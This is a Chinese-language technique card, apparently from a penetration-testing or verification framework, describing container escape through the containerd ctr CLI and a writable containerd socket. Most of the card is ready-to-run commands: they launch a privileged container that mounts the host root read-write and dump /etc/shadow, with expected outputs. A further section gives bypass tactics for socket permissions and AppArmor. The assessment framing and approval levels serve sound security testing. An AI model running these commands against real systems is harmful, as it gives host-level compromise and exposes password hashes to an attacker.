---
source: manual
confidence: medium
platforms: [containerd]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-2.4]
mapped_compliance_families: [containerd配置, 文件权限]
---

# ctr-tool-abuse — containerd ctr 工具滥用

攻击者可访问 `ctr` 工具且 containerd socket（`/run/containerd/containerd.sock`）可读写时，可直接通过 ctr 创建特权容器并挂载宿主机根目录，实现容器逃逸。

---

## 1. 前置条件

- containerd 运行时已部署
- `ctr` CLI 工具可用（PATH 中存在）
- containerd socket `/run/containerd/containerd.sock` 可读写（当前用户有权限）

检查命令：
```bash
# [L0] 检查 ctr 工具是否存在
which ctr
# 期望输出: /usr/local/bin/ctr 或 /usr/bin/ctr

# [L0] 检查 containerd socket 权限
ls -la /run/containerd/containerd.sock
# 期望输出: srw-rw---- ... root root ...（权限含 rw）
```

## 2. 探测命令

```bash
# [L0] 确认 ctr 可执行
ctr version
# 期望输出: ctr + containerd 版本信息

# [L0] 确认 containerd socket 可访问
ls -la /run/containerd/containerd.sock
# 期望输出: socket 文件且当前用户可读写

# [L1] 通过 socket 列出现有容器/镜像
ctr --address /run/containerd/containerd.sock list
# 期望输出: 现有容器列表（证明可操作 containerd）

# [L1] 列出可用镜像
ctr --address /run/containerd/containerd.sock images list
# 期望输出: 已拉取镜像列表
```

## 3. 攻击验证

```bash
# [L2] 拉取镜像（若本地无 alpine）
ctr --address /run/containerd/containerd.sock image pull docker.io/library/alpine:latest
# 期望输出: 镜像拉取成功

# [L2] 创建特权容器并把根目录挂载
ctr --address /run/containerd/containerd.sock run --privileged --rm --mount type=bind,src=/,dst=/hostfs,options=rbind:rw docker.io/library/alpine:latest test-container /bin/sh -c "cat /hostfs/etc/shadow"
# 期望输出: root:$6$...:... (宿主机 shadow 内容)

# [L2] 在逃逸容器中执行任意命令
ctr --address /run/containerd/containerd.sock run --privileged --rm --mount type=bind,src=/,dst=/hostfs,options=rbind:rw docker.io/library/alpine:latest test-container2 /bin/sh -c "ls /hostfs/etc/hostname"
# 期望输出: /etc/hostname → 证明已访问宿主机文件系统
```

## 4. 差分证明

```bash
# [L0] 攻击前：记录现有 containerd 容器列表
ctr --address /run/containerd/containerd.sock list
# 期望输出: 攻击前无 test-container

# [L2] ctr 创建后容器出现
ctr --address /run/containerd/containerd.sock list
# 期望输出: 出现 test-container → 证明在 containerd 层创建了新容器

# [L0] 攻击前：容器内无法访问宿主机 /etc/shadow
cat /etc/shadow 2>&1
# 期望输出: No such file or directory（容器视角）

# [L2] 通过 ctr 特权容器读取宿主机 /etc/shadow
ctr --address /run/containerd/containerd.sock run --privileged --rm --mount type=bind,src=/,dst=/hostfs,options=rbind:rw docker.io/library/alpine:latest test-container /bin/sh -c "cat /hostfs/etc/shadow"
# 期望输出: shadow 内容 → 证明逃逸成功
```

差分结论：攻击前未发现 test-container 且无法访问宿主机文件，攻击后通过 ctr 创建特权容器成功挂载宿主机根目录并读取 `/etc/shadow`，证明 containerd socket 可达时可直接逃逸宿主机。

## 5. 绕过策略

```bash
# [L1] 检查 containerd socket 文件权限
ls -la /run/containerd/containerd.sock
# 若输出 srw------- ... root ... → 仅 root 可访问，普通用户受阻

# [L1] 检查 AppArmor 是否限制 containerd 操作
cat /proc/1/attr/current
# 若输出含 containerd-profile 或限制名 → AppArmor 可能阻断

# 绕过方式：
# - [L1] 若 socket 权限严格，检查是否有同名 socket 在其他路径（find / -name containerd.sock）
# - [L2] 若 AppArmor 限制 ctr 但未限制 socket 文件操作，使用 crictl 或 nerdcntl 等替代 CLI 直接通信
# - [L2] 若 socket 在容器内不可达但宿主机可访问，结合其他逃逸路径先获得宿主机 shell
```

## 6. 证伪条件

```bash
# [L0] ctr 工具不存在
which ctr
# 输出: 无输出 → 证伪

# [L0] containerd socket 不存在或不可访问
ls -la /run/containerd/containerd.sock 2>&1
# 输出: No such file or directory 或 Permission denied → 证伪

# [L1] socket 存在但连接失败
ctr --address /run/containerd/containerd.sock version 2>&1
# 输出: connection failed → 证伪
```

## 7. 审批级别

- **L2** ctr 创建特权容器验证（挂载宿主机根目录）→ **Level 4**（创建临时容器并挂载宿主机文件系统，需人工确认）
- **L1** 探测命令 → **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Privilege Escalation / Defense Evasion
- **Technique ID**: T1611
- **Technique Name**: Escape to Host
- **描述**: 攻击者通过可达的 containerd socket 与 `ctr` CLI 在宿主机上创建特权容器并挂载宿主机根目录，实现从容器/受限环境到宿主机的逃逸。